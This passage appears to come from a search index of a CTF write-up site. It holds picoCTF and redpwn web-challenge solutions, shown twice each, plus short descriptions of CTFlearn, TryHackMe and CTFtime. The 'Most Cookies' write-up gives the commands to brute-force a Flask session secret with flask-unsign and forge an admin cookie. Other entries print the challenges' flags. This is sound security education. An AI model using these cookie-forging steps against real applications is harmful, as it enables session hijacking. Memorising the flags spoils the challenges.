need to become admin to swipe that flag! OK ... back to crying ;'D Let's visit the given site . Use our old friend inspect > Application > Storage > Cookies From there, we see a cookie named session. View the cookie value: eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.YGEboA.IQGWCL0DE41HutgJ_FAK438Iams You can view more information here for the details of each cookie value segment. Let's go to https://jwt.io/ to decode that cookie value ... we observe that the header is { \"very_auth\": \"blank\" } Yikes. We want to be \"admin\" instead of \"blank\" Another thing to point out on that site is that there is a \"verify signature\" section. Since flask cookies involve encryption, there is a secret key set to protect against attackers. So here's the official plan (heavily inspired by this video ): 1. Find the secret key Due to being heavily inspired by the video, we will use a virtual machine to use the Ubuntu operating system . Ubuntu is great since Python is pre-installed into it and has packages that Windows lacks. After abusing google, I found this blessing, flask-unsign , which is a tool that will help us uncover the secret key. Let's install flask-unsign. $ pip3 install flask-unsign Ok, let's see how it works. On the given pico website, let's enter a cookie \"snickerdoodle\" (part of the cookie name list). Then you should see a page that says \"I love snickerdoodle cookies!\". Anyways, just inspect the page and copy the cookie value. Paste it in the following code. $ flask-unsign --decode --cookie 'eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.YGEviQ.nGAiw1-qnImOSgTL5Lk19SjA97A' # outputs {'very_auth': 'snickerdoodle'} We're very close to greatness! Now let's continue to scroll down the flask-unsign website shall we ... and we see this section 'Unsigning (Brute Forcing Secret Keys)'. FIRST WAY THAT I USED TO FIND THE SECRET KEY $ flask-unsign --unsign --cookie < cookie.txt # this is the code on the flask-unsign website I stared at the code and realized their cookie.txt contained a cookie value. So I decided to make my own cookie.txt with a cookie value inside: eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.YGEviQ.nGAiw1-qnImOSgTL5Lk19SjA97A The cookie value I stashed into cookie.txt is the one above where I entered 'snickerdoodle'. I also made a wordlist.txt of the cookie names found in server.py (this will serve as my word list to brute force the secret key). View in the references section at the bottom. Ensure that you are in the correct folder that contains cookie.txt and wordlist.txt ... then you can enter this script: $ flask-unsign --unsign --cookie < cookie.txt --wordlist wordlist.txt After an agonizing 1 second, you are slapped with the secret key!! In my case, it was 'fortune'. Lucky me! FASTER WAY THAT I USED TO FIND THE SECRET KEY $ flask-unsign --unsign --server 'http://mercury.picoctf.net:65344/' --wordlist wordlist.txt 2. Use the secret key to generate our own cookie With the secret key, the rest will be a breeze. Time to forge our own session cookie! >:D I found this godly website about encoding flask session cookies. On the website, there is an 'Encode' section ... so I used their code. $ flask_session_cookie_manager3.py encode -s fortune -t \"{'very_auth':'admin'}\" # we attach the secret key and confirm admin And ... we are blessed with our very own forged cookie!!!!!!!!!!!!!!! eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.YGEVdA.Fqe_gJWtcM37UiFmpaWsMkhel6w 3. Insert our cookie into the site to replace the cookie value Copy and paste that bad boy into the cookie value. 4. Reload the page to receive salvation Flag picoCTF{pwn_4ll_th3_cook1E5_25bdb6f6} References server.py from flask import Flask, render_template, request, url_for, redirect, make_response, flash, session import random app = Flask(__name__) flag_value = open(\"./flag\").read().rstrip() title = \"Most Cookies\" cookie_names = [\"snickerdoodle\", \"chocolate chip\", \"oatmeal raisin\", \"gingersnap\", \"shortbread\", \"peanut butter\", \"whoopie pie\", \"sugar\", \"molasses\", \"kiss\", \"biscotti\", \"butter\", \"spritz\", \"snowball\", \"drop\", \"thumbprint\", \"pinwheel\", \"wafer\", \"macaroon\", \"fortune\", \"crinkle\", \"icebox\", \"gingerbread\", \"tassie\", \"lebkuchen\", \"macaron\", \"black and white\", \"white chocolate macadamia\"] app.secret_key = random.choice(cookie_names) @app.route(\"/\") def main(): if session.get(\"very_auth\"): check = session[\"very_auth\"] if check == \"blank\": return render_template(\"index.html\", title=title) else: return make_response(redirect(\"/display\")) else: resp = make_response(redirect(\"/\")) session[\"very_auth\"] = \"blank\" return resp @app.route(\"/search\", methods=[\"GET\", \"POST\"]) def search(): if \"name\" in request.form and request.form[\"name\"] in cookie_names: resp = make_response(redirect(\"/display\")) session[\"very_auth\"] = request.form[\"name\"] return resp else: message = \"That doesn't appear to be a valid cookie.\" category = \"danger\" flash(message, category) resp = make_response(redirect(\"/\")) session[\"very_auth\"] = \"blank\" return resp @app.route(\"/reset\") def reset(): resp = make_response(redirect(\"/\")) session.pop(\"very_auth\", None) return resp @app.route(\"/display\", methods=[\"GET\"]) def flag(): if session.get(\"very_auth\"): check = session[\"very_auth\"] if check == \"admin\": resp = make_response(render_template(\"flag.html\", value=flag_value, title=title)) return resp flash(\"That is a cookie! Not very special though...\", \"success\") return render_template(\"not-flag.html\", title=title, cookie_name=session[\"very_auth\"]) else: resp = make_response(redirect(\"/\")) session[\"very_auth\"] = \"blank\" return resp if __name__ == \"__main__\": app.run() wordlist.txt snickerdoodle chocolate chip oatmeal raisin gingersnap shortbread peanut butter whoopie pie sugar molasses kiss biscotti butter spritz snowball drop thumbprint pinwheel wafer macaroon fortune crinkle icebox gingerbread tassie lebkuchen macaron black and white white chocolate macadamia Writeup from https://github.com/vivian-dai/PicoCTF2021-Writeup/blob/main/Web%20Exploitation/Most%20Cookies/MostCookies.md","title":"Most Cookies"},{"location":"Writeup/Web%20Exploitation/Most%20Cookies/#most-cookies","text":"Category: Web Exploitation Source: picoCTF 2021 Author: MADSTACKS Score: 15","title":"Most Cookies"},{"location":"Writeup/Web%20Exploitation/Most%20Cookies/#description","text":"Alright, enough of using my own encryption. Flask session cookies should be plenty secure! server.py http://mercury.picoctf.net:44693/","title":"Description"},{"location":"Writeup/Web%20Exploitation/Most%20Cookies/#hints","text":"How secure is a flask cookie?","title":"Hints"},{"location":"Writeup/Web%20Exploitation/Most%20Cookies/#approach","text":"I analyzed the server.py reference code. The highlighted code below has great importance. def flag(): if session.get(\"very_auth\"): check = session[\"very_auth\"] if check == \"admin\": resp = make_response(render_template(\"flag.html\", value=flag_value, title=title)) return resp flash(\"That is a cookie! Not very special though...\", \"success\") return render_template(\"not-flag.html\", title=title, cookie_name=session[\"very_auth\"]) else: resp = make_response(redirect(\"/\")) session[\"very_auth\"] = \"blank\" return resp I found that if you entered a cookie name given in the cookie name list (view line 7 in the server.py code), you will go into the first if statement but completely miss the nested if: if check == \"admin\": From this, it is clear we need to become admin to swipe that flag! OK ... back to crying ;'D Let's visit the given site . Use our old friend inspect > Application > Storage > Cookies From there, we see a cookie named session. View the cookie value: eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.YGEboA.IQGWCL0DE41HutgJ_FAK438Iams You can view more information here for the details of each cookie value segment. Let's go to https://jwt.io/ to decode that cookie value ... we observe that the header is { \"very_auth\": \"blank\" } Yikes. We want to be \"admin\" instead of \"blank\" Another thing to point out on that site is that there is a \"verify signature\" section. Since flask cookies involve encryption, there is a secret key set to protect against attackers. So here's the official plan (heavily inspired by this video ):","title":"Approach"},{"location":"Writeup/Web%20Exploitation/Most%20Cookies/#1-find-the-secret-key","text":"Due to being heavily inspired by the video, we will use a virtual machine to use the Ubuntu operating system . Ubuntu is great since Python is pre-installed into it and has packages that Windows lacks. After abusing google, I found this blessing, flask-unsign , which is a tool that will help us uncover the secret key. Let's install flask-unsign. $ pip3 install flask-unsign Ok, let's see how it works. On the given pico website, let's enter a cookie \"snickerdoodle\" (part of the cookie name list). Then you should see a page that says \"I love snickerdoodle cookies!\". Anyways, just inspect the page and copy the cookie value. Paste it in the following code. $ flask-unsign --decode --cookie 'eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.YGEviQ.nGAiw1-qnImOSgTL5Lk19SjA97A' # outputs {'very_auth': 'snickerdoodle'} We're very close to greatness! Now let's continue to scroll down the flask-unsign website shall we ... and we see this section 'Unsigning (Brute Forcing Secret Keys)'.","title":"1. Find the secret key"},{"location":"Writeup/Web%20Exploitation/Most%20Cookies/#first-way-that-i-used-to-find-the-secret-key","text":"$ flask-unsign --unsign --cookie < cookie.txt # this is the code on the flask-unsign website I stared at the code and realized their cookie.txt contained a cookie value. So I decided to make my own cookie.txt with a cookie value inside: eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.YGEviQ.nGAiw1-qnImOSgTL5Lk19SjA97A The cookie value I stashed into cookie.txt is the one above where I entered 'snickerdoodle'. I also made a wordlist.txt of the cookie names found in server.py (this will serve as my word list to brute force the secret key). View in the references section at the bottom. Ensure that you are in the correct folder that contains cookie.txt and wordlist.txt ... then you can enter this script: $ flask-unsign --unsign --cookie < cookie.txt --wordlist wordlist.txt After an agonizing 1 second, you are slapped with the secret key!! In my case, it was 'fortune'. Lucky me!","title":"FIRST WAY THAT I USED TO FIND THE SECRET KEY"},{"location":"Writeup/Web%20Exploitation/Most%20Cookies/#faster-way-that-i-used-to-find-the-secret-key","text":"$ flask-unsign --unsign --server 'http://mercury.picoctf.net:65344/' --wordlist wordlist.txt","title":"FASTER WAY THAT I USED TO FIND THE SECRET KEY"},{"location":"Writeup/Web%20Exploitation/Most%20Cookies/#2-use-the-secret-key-to-generate-our-own-cookie","text":"With the secret key, the rest will be a breeze. Time to forge our own session cookie! >:D I found this godly website about encoding flask session cookies. On the website, there is an 'Encode' section ... so I used their code. $ flask_session_cookie_manager3.py encode -s fortune -t \"{'very_auth':'admin'}\" # we attach the secret key and confirm admin And ... we are blessed with our very own forged cookie!!!!!!!!!!!!!!! eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.YGEVdA.Fqe_gJWtcM37UiFmpaWsMkhel6w","title":"2. Use the secret key to generate our own cookie"},{"location":"Writeup/Web%20Exploitation/Most%20Cookies/#3-insert-our-cookie-into-the-site-to-replace-the-cookie-value","text":"Copy and paste that bad boy into the cookie value.","title":"3. Insert our cookie into the site to replace the cookie value"},{"location":"Writeup/Web%20Exploitation/Most%20Cookies/#4-reload-the-page-to-receive-salvation","text":"","title":"4. Reload the page to receive salvation"},{"location":"Writeup/Web%20Exploitation/Most%20Cookies/#flag","text":"picoCTF{pwn_4ll_th3_cook1E5_25bdb6f6}","title":"Flag"},{"location":"Writeup/Web%20Exploitation/Most%20Cookies/#references","text":"","title":"References"},{"location":"Writeup/Web%20Exploitation/Most%20Cookies/#serverpy","text":"from flask import Flask, render_template, request, url_for, redirect, make_response, flash, session import random app = Flask(__name__) flag_value = open(\"./flag\").read().rstrip() title = \"Most Cookies\" cookie_names = [\"snickerdoodle\", \"chocolate chip\", \"oatmeal raisin\", \"gingersnap\", \"shortbread\", \"peanut butter\", \"whoopie pie\", \"sugar\", \"molasses\", \"kiss\", \"biscotti\", \"butter\", \"spritz\", \"snowball\", \"drop\", \"thumbprint\", \"pinwheel\", \"wafer\", \"macaroon\", \"fortune\", \"crinkle\", \"icebox\", \"gingerbread\", \"tassie\", \"lebkuchen\", \"macaron\", \"black and white\", \"white chocolate macadamia\"] app.secret_key = random.choice(cookie_names) @app.route(\"/\") def main(): if session.get(\"very_auth\"): check = session[\"very_auth\"] if check == \"blank\": return render_template(\"index.html\", title=title) else: return make_response(redirect(\"/display\")) else: resp = make_response(redirect(\"/\")) session[\"very_auth\"] = \"blank\" return resp @app.route(\"/search\", methods=[\"GET\", \"POST\"]) def search(): if \"name\" in request.form and request.form[\"name\"] in cookie_names: resp = make_response(redirect(\"/display\")) session[\"very_auth\"] = request.form[\"name\"] return resp else: message = \"That doesn't appear to be a valid cookie.\" category = \"danger\" flash(message, category) resp = make_response(redirect(\"/\")) session[\"very_auth\"] = \"blank\" return resp @app.route(\"/reset\") def reset(): resp = make_response(redirect(\"/\")) session.pop(\"very_auth\", None) return resp @app.route(\"/display\", methods=[\"GET\"]) def flag(): if session.get(\"very_auth\"): check = session[\"very_auth\"] if check == \"admin\": resp = make_response(render_template(\"flag.html\", value=flag_value, title=title)) return resp flash(\"That is a cookie! Not very special though...\", \"success\") return render_template(\"not-flag.html\", title=title, cookie_name=session[\"very_auth\"]) else: resp = make_response(redirect(\"/\")) session[\"very_auth\"] = \"blank\" return resp if __name__ == \"__main__\": app.run()","title":"server.py"},{"location":"Writeup/Web%20Exploitation/Most%20Cookies/#wordlisttxt","text":"snickerdoodle chocolate chip oatmeal raisin gingersnap shortbread peanut butter whoopie pie sugar molasses kiss biscotti butter spritz snowball drop thumbprint pinwheel wafer macaroon fortune crinkle icebox gingerbread tassie lebkuchen macaron black and white white chocolate macadamia Writeup from https://github.com/vivian-dai/PicoCTF2021-Writeup/blob/main/Web%20Exploitation/Most%20Cookies/MostCookies.md","title":"wordlist.txt"},{"location":"Writeup/Web%20Exploitation/Scavenger%20Hunt/","text":"Scavenger Hunt Category: Web Exploitation Source: picoCTF 2021 Author: MADSTACKS Score: 10 Description There is some interesting information hidden around this site http://mercury.picoctf.net:5080/. Can you find it? Hints You should have enough hints to find the files, don't run a brute forcer. Approach Clicking on the link brings us to some boring HTML. Ctrl + Shift + I will show the source code of the page: <html><head> <title>Scavenger Hunt</title> <link href=\"https://fonts.googleapis.com/css?family=Open+Sans|Roboto\" rel=\"stylesheet\"> <link rel=\"stylesheet\" type=\"text/css\" href=\"mycss.css\"> <script type=\"application/javascript\" src=\"myjs.js\"></script> </head> <body> <div class=\"container\"> <header> <h1>Just some boring HTML</h1> </header> <button class=\"tablink\" onclick=\"openTab('tabintro', this, '#222')\" id=\"defaultOpen\" style=\"background-color: rgb(34, 34, 34);\">How</button> <button class=\"tablink\" onclick=\"openTab('tababout', this, '#222')\" style=\"\">What</button> <div id=\"tabintro\" class=\"tabcontent\" style=\"display: block;\"> <h3>How</h3> <p>How do you like my website?</p> </div> <div id=\"tababout\" class=\"tabcontent\" style=\"display: none;\"> <h3>What</h3> <p>I used these to make this site: <br> HTML <br> CSS <br> JS (JavaScript) </p> <!-- Here's the first part of the flag: picoCTF{t --> </div> </div> </body></html> This comment <!-- Here's the first part of the flag: picoCTF{t --> gives us the first part of the flag. Next, there are some files linked to it like the CSS and JS. <link rel=\"stylesheet\" type=\"text/css\" href=\"mycss.css\"> <script type=\"application/javascript\" src=\"myjs.js\"></script> Adding /mycss.css to the URL gives access to the CSS file div.container { width: 100%; } header { background-color: black; padding: 1em; color: white; clear: left; text-align: center; } body { font-family: Roboto; } h1 { color: white; } p { font-family: \"Open Sans\"; } .tablink { background-color: #555; color: white; float: left; border: none; outline: none; cursor: pointer; padding: 14px 16px; font-size: 17px; width: 50%; } .tablink:hover { background-color: #777; } .tabcontent { color: #111; display: none; padding: 50px; text-align: center; } #tabintro { background-color: #ccc; } #tababout { background-color: #ccc; } /* CSS makes the page look nice, and yes, it also has part of the flag. Here's part 2: h4ts_4_l0 */ Nice, here's the next part of the flag /* CSS makes the page look nice, and yes, it also has part of the flag. Here's part 2: h4ts_4_l0 */ Next, we can check out the JS by replacing mycss.css with myjs.js . The JS file reveals: function openTab(tabName,elmnt,color) { var i, tabcontent, tablinks; tabcontent = document.getElementsByClassName(\"tabcontent\"); for (i = 0; i < tabcontent.length; i++) { tabcontent[i].style.display = \"none\"; } tablinks = document.getElementsByClassName(\"tablink\"); for (i = 0; i < tablinks.length; i++) { tablinks[i].style.backgroundColor = \"\"; } document.getElementById(tabName).style.display = \"block\"; if(elmnt.style != null) { elmnt.style.backgroundColor = color; } } window.onload = function() { openTab('tabintro', this, '#222'); } /* How can I keep Google from indexing my website? */ /* How can I keep Google from indexing my website? */` hmmm. I searched up \"index website on google\" and it brought up things about web crawlers. [This](https://www.google.com/search/howsearchworks/crawling-indexing/) made me think it's possible a robots exclusion file (robots.txt) might have something. I changed `myjs.js` to `robots.txt User-agent: * Disallow: /index.html # Part 3: t_0f_pl4c # I think this is an apache server... can you Access the next flag? Alright! The comments give part 3 of the flag as well as a hint for the next part. The .htacess file manages Apache server permissions. Replacing robots.txt with .htaccess got this: # Part 4: 3s_2_lO0k # I love making websites on my Mac, I can Store a lot of information there. What stands out the most about that hint is the capitalized \"Store\". In Macs, a .DS_Store file stores the configurations for how the desktop looks (eg. icon location, etc.) Changing .htacess with .DS_Store got Congrats! You completed the scavenger hunt. Part 5: _7a46d25d} Flag picoCTF{th4ts_4_l0t_0f_pl4c3s_2_lO0k_7a46d25d} Reference Writeup from https://github.com/vivian-dai/PicoCTF2021-Writeup/blob/main/Web%20Exploitation/Scavenger%20Hunt/Scavenger%20Hunt.md","title":"Scavenger Hunt"},{"location":"Writeup/Web%20Exploitation/Scavenger%20Hunt/#scavenger-hunt","text":"Category: Web Exploitation Source: picoCTF 2021 Author: MADSTACKS Score: 10","title":"Scavenger Hunt"},{"location":"Writeup/Web%20Exploitation/Scavenger%20Hunt/#description","text":"There is some interesting information hidden around this site http://mercury.picoctf.net:5080/. Can you find it?","title":"Description"},{"location":"Writeup/Web%20Exploitation/Scavenger%20Hunt/#hints","text":"You should have enough hints to find the files, don't run a brute forcer.","title":"Hints"},{"location":"Writeup/Web%20Exploitation/Scavenger%20Hunt/#approach","text":"Clicking on the link brings us to some boring HTML. Ctrl + Shift + I will show the source code of the page: <html><head> <title>Scavenger Hunt</title> <link href=\"https://fonts.googleapis.com/css?family=Open+Sans|Roboto\" rel=\"stylesheet\"> <link rel=\"stylesheet\" type=\"text/css\" href=\"mycss.css\"> <script type=\"application/javascript\" src=\"myjs.js\"></script> </head> <body> <div class=\"container\"> <header> <h1>Just some boring HTML</h1> </header> <button class=\"tablink\" onclick=\"openTab('tabintro', this, '#222')\" id=\"defaultOpen\" style=\"background-color: rgb(34, 34, 34);\">How</button> <button class=\"tablink\" onclick=\"openTab('tababout', this, '#222')\" style=\"\">What</button> <div id=\"tabintro\" class=\"tabcontent\" style=\"display: block;\"> <h3>How</h3> <p>How do you like my website?</p> </div> <div id=\"tababout\" class=\"tabcontent\" style=\"display: none;\"> <h3>What</h3> <p>I used these to make this site: <br> HTML <br> CSS <br> JS (JavaScript) </p> <!-- Here's the first part of the flag: picoCTF{t --> </div> </div> </body></html> This comment <!-- Here's the first part of the flag: picoCTF{t --> gives us the first part of the flag. Next, there are some files linked to it like the CSS and JS. <link rel=\"stylesheet\" type=\"text/css\" href=\"mycss.css\"> <script type=\"application/javascript\" src=\"myjs.js\"></script> Adding /mycss.css to the URL gives access to the CSS file div.container { width: 100%; } header { background-color: black; padding: 1em; color: white; clear: left; text-align: center; } body { font-family: Roboto; } h1 { color: white; } p { font-family: \"Open Sans\"; } .tablink { background-color: #555; color: white; float: left; border: none; outline: none; cursor: pointer; padding: 14px 16px; font-size: 17px; width: 50%; } .tablink:hover { background-color: #777; } .tabcontent { color: #111; display: none; padding: 50px; text-align: center; } #tabintro { background-color: #ccc; } #tababout { background-color: #ccc; } /* CSS makes the page look nice, and yes, it also has part of the flag. Here's part 2: h4ts_4_l0 */ Nice, here's the next part of the flag /* CSS makes the page look nice, and yes, it also has part of the flag. Here's part 2: h4ts_4_l0 */ Next, we can check out the JS by replacing mycss.css with myjs.js . The JS file reveals: function openTab(tabName,elmnt,color) { var i, tabcontent, tablinks; tabcontent = document.getElementsByClassName(\"tabcontent\"); for (i = 0; i < tabcontent.length; i++) { tabcontent[i].style.display = \"none\"; } tablinks = document.getElementsByClassName(\"tablink\"); for (i = 0; i < tablinks.length; i++) { tablinks[i].style.backgroundColor = \"\"; } document.getElementById(tabName).style.display = \"block\"; if(elmnt.style != null) { elmnt.style.backgroundColor = color; } } window.onload = function() { openTab('tabintro', this, '#222'); } /* How can I keep Google from indexing my website? */ /* How can I keep Google from indexing my website? */` hmmm. I searched up \"index website on google\" and it brought up things about web crawlers. [This](https://www.google.com/search/howsearchworks/crawling-indexing/) made me think it's possible a robots exclusion file (robots.txt) might have something. I changed `myjs.js` to `robots.txt User-agent: * Disallow: /index.html # Part 3: t_0f_pl4c # I think this is an apache server... can you Access the next flag? Alright! The comments give part 3 of the flag as well as a hint for the next part. The .htacess file manages Apache server permissions. Replacing robots.txt with .htaccess got this: # Part 4: 3s_2_lO0k # I love making websites on my Mac, I can Store a lot of information there. What stands out the most about that hint is the capitalized \"Store\". In Macs, a .DS_Store file stores the configurations for how the desktop looks (eg. icon location, etc.) Changing .htacess with .DS_Store got Congrats! You completed the scavenger hunt. Part 5: _7a46d25d}","title":"Approach"},{"location":"Writeup/Web%20Exploitation/Scavenger%20Hunt/#flag","text":"picoCTF{th4ts_4_l0t_0f_pl4c3s_2_lO0k_7a46d25d}","title":"Flag"},{"location":"Writeup/Web%20Exploitation/Scavenger%20Hunt/#reference","text":"Writeup from https://github.com/vivian-dai/PicoCTF2021-Writeup/blob/main/Web%20Exploitation/Scavenger%20Hunt/Scavenger%20Hunt.md","title":"Reference"},{"location":"Writeup/Web%20Exploitation/inspect-me/","text":"inspect-me Category: Web Exploitation Source: redpwn CTF 2021 Author: NotDeGhost Score: 5 Description See if you can find the flag in the source code! inspect-me.mc.ax Detailed solution Opening the challenge link https://inspect-me.mc.ax/ Checking the page source and we can see the flag in a comment tag view-source:https://inspect-me.mc.ax/ <body> <br><br><br> <h1><marquee><span><u>Van Der Pawn's SITE</u></span></marquee></h1> <hr> <h2>Welcome to Van Der Pawn's website!</h2> <br> <br> <img src=\"/const2.gif\"/> <br> <br> <h2>important updates!</h2> <li>We are working hard to always keep our site as up-to-date and modern as possible!</li> <li>TODO: remove flag from HTML comment</li> <!-- flag{inspect_me_like_123} --> <hr> <div style=\"display: flex; justify-content: center\"> <img src=\"/welcome.gif\" height=\"200px\"/> <img src=\"/welcome.gif\" height=\"200px\"/> <img src=\"/welcome.gif\" height=\"200px\"/> <img src=\"/welcome.gif\" height=\"200px\"/> <img src=\"/welcome.gif\" height=\"200px\"/> <img src=\"/welcome.gif\" height=\"200px\"/> </div> <hr> <br> <br> <img src=\"/ie.gif\" height=\"50px/\"><img src=\"/netscape.gif\" height=\"50px/\"> <br>Copyright (c) 2019 </div> </body> We got our flag Flag flag{inspect_me_like_123} Reference Writeup from https://github.com/BaadMaro/CTF/tree/main/redpwnCTF%202021/WEB%20-%20inspect-me","title":"inspect-me"},{"location":"Writeup/Web%20Exploitation/inspect-me/#inspect-me","text":"Category: Web Exploitation Source: redpwn CTF 2021 Author: NotDeGhost Score: 5","title":"inspect-me"},{"location":"Writeup/Web%20Exploitation/inspect-me/#description","text":"See if you can find the flag in the source code! inspect-me.mc.ax","title":"Description"},{"location":"Writeup/Web%20Exploitation/inspect-me/#detailed-solution","text":"Opening the challenge link https://inspect-me.mc.ax/ Checking the page source and we can see the flag in a comment tag view-source:https://inspect-me.mc.ax/ <body> <br><br><br> <h1><marquee><span><u>Van Der Pawn's SITE</u></span></marquee></h1> <hr> <h2>Welcome to Van Der Pawn's website!</h2> <br> <br> <img src=\"/const2.gif\"/> <br> <br> <h2>important updates!</h2> <li>We are working hard to always keep our site as up-to-date and modern as possible!</li> <li>TODO: remove flag from HTML comment</li> <!-- flag{inspect_me_like_123} --> <hr> <div style=\"display: flex; justify-content: center\"> <img src=\"/welcome.gif\" height=\"200px\"/> <img src=\"/welcome.gif\" height=\"200px\"/> <img src=\"/welcome.gif\" height=\"200px\"/> <img src=\"/welcome.gif\" height=\"200px\"/> <img src=\"/welcome.gif\" height=\"200px\"/> <img src=\"/welcome.gif\" height=\"200px\"/> </div> <hr> <br> <br> <img src=\"/ie.gif\" height=\"50px/\"><img src=\"/netscape.gif\" height=\"50px/\"> <br>Copyright (c) 2019 </div> </body> We got our flag","title":"Detailed solution"},{"location":"Writeup/Web%20Exploitation/inspect-me/#flag","text":"flag{inspect_me_like_123}","title":"Flag"},{"location":"Writeup/Web%20Exploitation/inspect-me/#reference","text":"Writeup from https://github.com/BaadMaro/CTF/tree/main/redpwnCTF%202021/WEB%20-%20inspect-me","title":"Reference"},{"location":"website/Platform/CTFlearn/","text":"CTFlearn CTF learn is a challenge website for user update challenges and solve challenges. Those challenges are uploaded by community and users who solves the challenge can leave comments and score for the challenge. To submit flag and acquire scores, you need an account. In CTF learn, the accounts are free to register. Once you finish the registration, you may login with the account. For business user and education propose, CTF learn offers a professional edition called Learn++. Some online labs are also useful for beginners. Reference CTF learn link: https://ctflearn.com/","title":"CTFlearn"},{"location":"website/Platform/CTFlearn/#ctflearn","text":"CTF learn is a challenge website for user update challenges and solve challenges. Those challenges are uploaded by community and users who solves the challenge can leave comments and score for the challenge. To submit flag and acquire scores, you need an account. In CTF learn, the accounts are free to register. Once you finish the registration, you may login with the account. For business user and education propose, CTF learn offers a professional edition called Learn++. Some online labs are also useful for beginners.","title":"CTFlearn"},{"location":"website/Platform/CTFlearn/#reference","text":"CTF learn link: https://ctflearn.com/","title":"Reference"},{"location":"website/Platform/TryHackMe/","text":"TryHackMe Here's another platform for learning and hacking. The difference between tryhackme and ordinary CTF challenge website is that thm uses rooms for challenge. Each room contains of several questions and you need to finish them all to solve a room. The room is also called a target environment in cyber security. In case that vulnerabilities are available in rooms, each room should be created for each user. That's say, you need to create a room and deploy machine before hacking. All target environments are on the thm's cloud server and you don't need to configure local machine to deploy target environment. However, you need to connect to the thm's local network so that you can hack the target environment. Two ways for user to connect. The first and free way is to use OpenVPN and configure your VPN with thm's ovpn file. The second is to use hack box, for community user, free box can only be used 1 hour one day. Otherwise, you need to purchase premium edition of thm. Rooms are also can be uploaded by users. This makes it possible for us to create our own target environment. Besides, thm provides several learning courses for beginners. For advanced users, there some other useful pages provided by thm. You can find some useful blog related to the cybersecurity and some other websites such like tutorials, terms, swag shop. TryHackMe is a great platform for both beginners and advanced hackers. Reference TryHackMe link: https://tryhackme.com/docs","title":"TryHackMe"},{"location":"website/Platform/TryHackMe/#tryhackme","text":"Here's another platform for learning and hacking. The difference between tryhackme and ordinary CTF challenge website is that thm uses rooms for challenge. Each room contains of several questions and you need to finish them all to solve a room. The room is also called a target environment in cyber security. In case that vulnerabilities are available in rooms, each room should be created for each user. That's say, you need to create a room and deploy machine before hacking. All target environments are on the thm's cloud server and you don't need to configure local machine to deploy target environment. However, you need to connect to the thm's local network so that you can hack the target environment. Two ways for user to connect. The first and free way is to use OpenVPN and configure your VPN with thm's ovpn file. The second is to use hack box, for community user, free box can only be used 1 hour one day. Otherwise, you need to purchase premium edition of thm. Rooms are also can be uploaded by users. This makes it possible for us to create our own target environment. Besides, thm provides several learning courses for beginners. For advanced users, there some other useful pages provided by thm. You can find some useful blog related to the cybersecurity and some other websites such like tutorials, terms, swag shop. TryHackMe is a great platform for both beginners and advanced hackers.","title":"TryHackMe"},{"location":"website/Platform/TryHackMe/#reference","text":"TryHackMe link: https://tryhackme.com/docs","title":"Reference"},{"location":"website/Platform/ctftime/","text":"ctftime CTF time is a platform to provide schedule for upcoming and past CTF events. Famous CTF events usually synchronize their schedule to the CTF time, and CTFers all along the world would participate the event. Some famous CTF team also have their CTF time page to show their gains and record during the events. Along with the events schedule and team page, writeups are also collected by CTF time. Find writeups for the event by clicking corresponding event page and find Event tasks and writeups page. Find upcoming CTF events using CTF time. Reference CTF time link: https://ctftime.org/","title":"ctftime"},{"location":"website/Platform/ctftime/#ctftime","text":"CTF time is a platform to provide schedule for upcoming and past CTF events. Famous CTF events usually synchronize their schedule to the CTF time, and CTFers all along the world would participate the event. Some famous CTF team also have their CTF time page to show their gains and record during the events. Along with the events schedule and team page, writeups are also collected by CTF time. Find writeups for the event by clicking corresponding event page and find Event tasks and writeups page. Find upcoming CTF events using CTF time.","title":"ctftime"},{"location":"website/Platform/ctftime/#reference","text":"CTF time link: https://ctftime.org/","title":"Reference"}]}